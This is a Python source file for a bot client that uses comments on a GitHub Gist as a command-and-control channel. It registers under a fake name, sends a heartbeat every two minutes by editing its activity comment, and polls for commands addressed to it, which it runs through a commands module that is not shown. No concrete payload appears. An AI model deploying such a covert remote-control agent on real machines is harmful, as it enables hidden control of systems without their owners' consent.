import string

import schedule
import time
from github.GistComment import GistComment

from Commands import commands
from Util import *


def ping(activity_comment: GistComment):
    if activity_comment.body.endswith(" "):
        new_body = activity_comment.body.strip()
    else:
        new_body = activity_comment.body + " "
    activity_comment.edit(new_body)


def init_activity_comment(main_gist: Gist, fake_name: string) -> GistComment:
    comment = main_gist.create_comment(f"{ACTIVITY_COMMENT}{fake_name}")  # todo check unique

    schedule.every(2).minutes.do(lambda: ping(comment))

    return comment


def process_command(gist: Gist, name: string, processed_comments) -> None:
    print("processing commands")
    last_comment: GistComment = get_last_comment(gist)

    if name in last_comment.body and last_comment.id not in processed_comments:
        print("found command for this bot")
        response = ""
        for command in commands:
            if command.get_request_command() in last_comment.body:
                response = command.receive(gist, name, last_comment.body)
        if response == "":
            print("Unknown Command")
            processed_comments.append(last_comment.id)
            return
        processed_comments.append(response)  # todo rm processed comments ?

    else:
        print("No commands received")


def main():
    g = login()
    gist = g.get_gist(get_gist_id())
    name = get_name(gist)
    print(f"hi, I am {name}")
    processed_comments = []
    activity_comment = init_activity_comment(gist, name)
    processed_comments.append(activity_comment.id)
    while True:
        schedule.run_pending()
        process_command(gist, name, processed_comments)
        time.sleep(1)


if __name__ == '__main__':
    main()
